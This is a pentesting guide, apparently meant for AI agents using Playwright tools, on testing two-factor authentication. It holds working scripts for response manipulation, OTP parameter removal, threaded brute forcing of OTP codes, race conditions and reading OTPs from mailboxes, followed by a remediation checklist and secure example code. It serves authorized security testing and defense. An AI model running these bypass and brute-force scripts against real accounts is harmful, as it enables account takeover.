# 2FA/OTP Bypass Testing for Authorized Pentesting

Comprehensive guide to testing two-factor authentication implementations during authorized security assessments.

---

## 2FA Types

### Time-Based One-Time Password (TOTP)
- Google Authenticator
- Authy
- Microsoft Authenticator
- 6-digit codes (30-second validity)

### SMS-Based OTP
- Text message codes
- 4-6 digit codes
- Delivery via SMS gateway

### Email-Based OTP
- Email codes
- 4-6 digit codes
- Delivery via email

### Push Notifications
- Mobile app approval
- Biometric verification
- Device-based

### Hardware Tokens
- YubiKey
- RSA SecurID
- FIDO2/WebAuthn

---

## Testing Methodology

### Phase 1: 2FA Implementation Analysis

```
Analyze 2FA flow:
1. Trigger 2FA (login with valid credentials)
2. Observe code generation/delivery
3. Map authentication flow
4. Identify validation endpoints
5. Check session handling
6. Document implementation details
```

---

## Bypass Techniques

## Technique 1: Response Manipulation

**Description**: Modify authentication response to bypass 2FA

### Test: Status Code Manipulation

```javascript
// Intercept response (using Burp or proxy)
// Original response:
HTTP/1.1 401 Unauthorized
{
  "success": false,
  "mfa_required": true,
  "authenticated": false
}

// Modified response:
HTTP/1.1 200 OK
{
  "success": true,
  "mfa_required": false,
  "authenticated": true
}
```

**Playwright Test**:
```javascript
// Intercept and modify response
await playwright_run_code({
  code: `async (page) => {
    await page.route('**/verify-2fa', route => {
      route.fulfill({
        status: 200,
        body: JSON.stringify({success: true, authenticated: true})
      });
    });

    // Try to access protected resource
    await page.goto('https://target.com/dashboard');
  }`
});
```

---

## Technique 2: Direct Endpoint Access

**Description**: Access authenticated endpoints without 2FA

### Test: Skip 2FA Page

```javascript
// Step 1: Login (get session cookie)
await fetch('/login', {
  method: 'POST',
  body: JSON.stringify({username: 'test', password: 'test123'})
});

// Step 2: Skip 2FA page, go direct to dashboard
await fetch('/dashboard', {
  credentials: 'include'  // Use session cookie
});
```

**Playwright Test**:
```javascript
// Login
await playwright_type({element: 'username', ref: '#username', text: 'test'});
await playwright_type({element: 'password', ref: '#password', text: 'test123'});
await playwright_click({element: 'login', ref: 'button[type="submit"]'});

// Skip 2FA page - navigate directly
await playwright_navigate({url: 'https://target.com/dashboard'});

// Check if accessed without 2FA
const snapshot = await playwright_snapshot();
```

---

## Technique 3: OTP Parameter Manipulation

**Description**: Remove or manipulate OTP parameter

### Test: Parameter Removal

```javascript
// Original request:
POST /verify-2fa
{
  "username": "test",
  "otp": "123456"
}

// Test 1: Remove OTP parameter
POST /verify-2fa
{
  "username": "test"
  // otp removed
}

// Test 2: Empty OTP
POST /verify-2fa
{
  "username": "test",
  "otp": ""
}

// Test 3: Null OTP
POST /verify-2fa
{
  "username": "test",
  "otp": null
}
```

---

## Technique 4: Code Reusability

**Description**: Reuse old OTP codes

### Test: Reuse Valid Code

```python
# 1. Get valid OTP code
otp = get_otp_from_email()  # e.g., "123456"

# 2. Use code successfully
verify_2fa(otp)  # Works first time

# 3. Try to reuse same code
verify_2fa(otp)  # Should fail but test if it works

# 4. Test with expired code (old code from previous session)
old_otp = "654321"
verify_2fa(old_otp)  # Should definitely fail
```

**Expected**: Codes should be single-use and expire after first use.

---

## Technique 5: Brute Force OTP

**Description**: Brute force 4-6 digit codes without rate limiting

### Test: 4-Digit Code

```python
import requests

# 4-digit code = 10,000 combinations (0000-9999)
for code in range(10000):
    otp = str(code).zfill(4)  # Zero-pad to 4 digits

    response = requests.post('https://target.com/verify-2fa', json={
        'username': 'test',
        'otp': otp
    })

    if response.status_code == 200:
        print(f"[+] Valid OTP found: {otp}")
        break

    if (code + 1) % 100 == 0:
        print(f"[*] Tested {code + 1}/10000...")
```

**Expected**: Should have rate limiting to prevent brute force.

### Test: 6-Digit Code

```python
# 6-digit = 1,000,000 combinations
# Requires distributed attack or rate limit bypass

import concurrent.futures

def test_otp(code):
    otp = str(code).zfill(6)
    response = requests.post('/verify-2fa', json={'otp': otp})
    return otp if response.status_code == 200 else None

# Parallel brute force
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(test_otp, i) for i in range(1000000)]

    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"[+] Valid OTP: {result}")
            break
```

---

## Technique 6: Predictable Code Generation

**Description**: Predict OTP based on algorithm weakness

### Test: Time-Based Prediction

```python
import hmac
import hashlib
import time
import struct

def generate_totp(secret, time_step=30):
    """Generate TOTP like Google Authenticator"""
    key = base64.b32decode(secret, True)
    msg = struct.pack(">Q", int(time.time() / time_step))
    h = hmac.new(key, msg, hashlib.sha1).digest()
    o = h[19] & 15
    h = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
    return str(h).zfill(6)

# If you can obtain/guess the secret:
secret = "suspected_secret_key"
predicted_otp = generate_totp(secret)
print(f"Predicted OTP: {predicted_otp}")

# Test prediction
response = verify_2fa(predicted_otp)
```

### Test: Sequential Patterns

```python
# Check if codes follow predictable patterns
codes_seen = []

for i in range(10):
    otp = get_otp_from_email()
    codes_seen.append(int(otp))

# Check for incrementing pattern
if codes_seen == sorted(codes_seen):
    print("[!] Codes are sequential - weak randomness!")

# Check for time-based pattern
import statistics
if statistics.stdev(codes_seen) < 1000:
    print("[!] Low variance - weak generation!")
```

---

## Technique 7: Session Persistence Pre-2FA

**Description**: Use old session tokens from before 2FA was enabled

### Test: Old Session Reuse

```javascript
// Scenario: User enabled 2FA after initial login

// 1. Login before 2FA enabled (get session cookie)
const oldSessionCookie = "session=old_token_before_2fa";

// 2. User enables 2FA

// 3. Try to use old session
await fetch('/dashboard', {
  headers: {
    'Cookie': oldSessionCookie
  }
});

// Expected: Old session should be invalidated
```

**Playwright Test**:
```javascript
// Save old cookies
const oldCookies = await playwright_run_code({
  code: `async (page) => await page.context().cookies()`
});

// Enable 2FA (through UI or API)
await enable_2fa();

// Restore old cookies
await playwright_run_code({
  code: `async (page) => await page.context().addCookies(${JSON.stringify(oldCookies)})`
});

// Try to access dashboard
await playwright_navigate({url: '/dashboard'});
```

---

## Technique 8: Backup Code Abuse

**Description**: Test backup code implementation

### Test: Backup Code Issues

```python
# 1. Get backup codes
backup_codes = get_backup_codes()  # e.g., ["12345678", "87654321", ...]

# 2. Test reusability
for code in backup_codes:
    # Use each code multiple times
    verify_2fa_with_backup(code)
    verify_2fa_with_backup(code)  # Should fail on reuse

# 3. Test rate limiting
for i in range(1000):
    verify_2fa_with_backup("invalid_code")  # Should be rate limited
```

---

## Technique 9: Race Condition

**Description**: Exploit race conditions in 2FA validation

### Test: Parallel Code Submission

```python
import concurrent.futures

otp = get_current_otp()  # Valid code

def submit_otp():
    return verify_2fa(otp)

# Submit same OTP multiple times simultaneously
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(submit_otp) for _ in range(10)]
    results = [f.result() for f in futures]

# Check if multiple submissions succeeded
successful = sum(results)
if successful > 1:
    print(f"[!] Race condition: {successful} submissions succeeded!")
```

---

## Technique 10: OTP Leakage

**Description**: Find OTP in responses, logs, or referrer

### Test: Response Leakage

```javascript
// Check if OTP is included in responses
const response = await fetch('/request-otp');
const body = await response.text();

// Search for 6-digit code pattern
const otpMatch = body.match(/\b\d{6}\b/);
if (otpMatch) {
    console.log(`[!] OTP leaked in response: ${otpMatch[0]}`);
}
```

### Test: Referrer Leakage

```javascript
// Check if OTP is in URL and leaked via Referer header
// Vulnerable pattern: /verify-2fa?code=123456

// Navigate with OTP in URL
await playwright_navigate({url: '/verify-2fa?code=123456'});

// Click external link
await playwright_click({element: 'external link', ref: 'a[href^="http"]'});

// Check network logs for Referer header leaking OTP
const requests = await playwright_network_requests();
```

---

## Email/SMS OTP Extraction

### Extract OTP from Email (IMAP)

```python
import imaplib
import email
import re
from datetime import datetime, timedelta

def extract_otp_from_email(email_address, password, from_sender):
    """Extract OTP code from email"""

    # Connect to IMAP server
    mail = imaplib.IMAP4_SSL('imap.gmail.com')  # or other provider
    mail.login(email_address, password)
    mail.select('inbox')

    # Search for recent emails from service
    date = (datetime.now() - timedelta(minutes=5)).strftime("%d-%b-%Y")
    search_criteria = f'(FROM "{from_sender}" SINCE {date})'

    _, messages = mail.search(None, search_criteria)

    if not messages[0]:
        return None

    # Get latest email
    latest_email_id = messages[0].split()[-1]
    _, msg_data = mail.fetch(latest_email_id, '(RFC822)')

    # Parse email
    email_message = email.message_from_bytes(msg_data[0][1])

    # Extract body
    if email_message.is_multipart():
        for part in email_message.walk():
            if part.get_content_type() == "text/plain":
                body = part.get_payload(decode=True).decode()
                break
    else:
        body = email_message.get_payload(decode=True).decode()

    # Extract OTP (6-digit code pattern)
    otp_pattern = r'\b\d{6}\b'
    match = re.search(otp_pattern, body)

    mail.logout()

    return match.group(0) if match else None

# Usage
otp = extract_otp_from_email(
    email_address="test@example.com",
    password="email_password",
    from_sender="noreply@targetsite.com"
)

print(f"Extracted OTP: {otp}")
```

### Extract OTP from Disposable Email Services

```python
import requests
import re

def get_otp_from_guerrilla_mail(email_address):
    """Extract OTP from Guerrilla Mail"""

    # Get email list
    response = requests.get(
        f"https://api.guerrillamail.com/ajax.php",
        params={
            "f": "get_email_list",
            "offset": 0,
            "email": email_address
        }
    )

    emails = response.json()['list']

    if not emails:
        return None

    # Get latest email content
    email_id = emails[0]['mail_id']
    response = requests.get(
        f"https://api.guerrillamail.com/ajax.php",
        params={
            "f": "fetch_email",
            "email_id": email_id
        }
    )

    body = response.json()['mail_body']

    # Extract OTP
    otp_match = re.search(r'\b\d{6}\b', body)
    return otp_match.group(0) if otp_match else None
```

---

## Testing Checklist

### OTP Generation

- [ ] Codes are cryptographically random
- [ ] Codes are not predictable
- [ ] Codes use sufficient length (6+ digits)
- [ ] TOTP uses 30-second time window
- [ ] Secrets are securely stored

### OTP Validation

- [ ] Server-side validation (not client-only)
- [ ] One-time use enforced
- [ ] Time-based expiration (2-5 minutes)
- [ ] Rate limiting (3-5 attempts)
- [ ] Account lockout after X failures

### Session Handling

- [ ] Old sessions invalidated when 2FA enabled
- [ ] Session requires 2FA completion
- [ ] Cannot skip 2FA page
- [ ] Session expires after timeout
- [ ] Re-authentication required for sensitive actions

### Backup Codes

- [ ] Backup codes are random
- [ ] One-time use enforced
- [ ] Rate limiting on attempts
- [ ] Regeneration available
- [ ] User notified when used

---

## Common Vulnerabilities

### Critical

**Direct Endpoint Access (CVSS 9.1)**:
- Description: Can access authenticated endpoints without 2FA
- Fix: Enforce 2FA on all session access

**Response Manipulation (CVSS 8.6)**:
- Description: Can modify response to bypass 2FA
- Fix: Server-side validation only

**Code Reusability (CVSS 8.1)**:
- Description: OTP codes can be reused
- Fix: Enforce one-time use and expiration

### High

**No Rate Limiting (CVSS 7.5)**:
- Description: Can brute force 4-6 digit codes
- Fix: Implement progressive rate limiting

**Weak Code Generation (CVSS 7.0)**:
- Description: Predictable OTP codes
- Fix: Use cryptographic randomness

---

## Remediation Recommendations

```python
# Example: Secure 2FA Implementation

class SecureTwoFactorAuth:
    def __init__(self):
        self.otp_attempts = {}  # Track attempts per user
        self.used_codes = set()  # Track used codes

    def generate_otp(self, user_id):
        """Generate cryptographically secure OTP"""
        import secrets

        # 6-digit random code
        otp = str(secrets.randbelow(1000000)).zfill(6)

        # Store with expiration
        self.store_otp(user_id, otp, expires_in=300)  # 5 minutes

        return otp

    def verify_otp(self, user_id, otp_code):
        """Verify OTP with security checks"""

        # Rate limiting
        if self.is_rate_limited(user_id):
            return False, "Too many attempts. Try again later."

        # Track attempt
        self.increment_attempts(user_id)

        # Check if code was already used
        if otp_code in self.used_codes:
            return False, "Code already used"

        # Get stored OTP
        stored_otp = self.get_stored_otp(user_id)

        if not stored_otp:
            return False, "Code expired or invalid"

        # Verify code
        if otp_code != stored_otp:
            # Account lockout after 5 failed attempts
            if self.otp_attempts.get(user_id, 0) >= 5:
                self.lock_account(user_id)
                return False, "Account locked"
            return False, "Invalid code"

        # Mark code as used
        self.used_codes.add(otp_code)
        self.delete_stored_otp(user_id)
        self.reset_attempts(user_id)

        return True, "Success"

    def is_rate_limited(self, user_id):
        """Check if user is rate limited"""
        attempts = self.otp_attempts.get(user_id, 0)
        return attempts >= 5
```

---

## Tools & Resources

**Email Access**:
- IMAP libraries (imaplib, imapclient)
- Gmail API
- Disposable email services (for testing)

**Testing Tools**:
- Burp Suite Intruder
- Playwright MCP
- curl/Postman

**References**:
- [2FA Bypass Techniques](https://github.com/EmadYaY/2FA-Bypass-Techniques)
- [HackTricks 2FA Guide](https://book.hacktricks.xyz/pentesting-web/2fa-bypass)
- [OWASP Authentication Testing](https://owasp.org/www-project-web-security-testing-guide/)
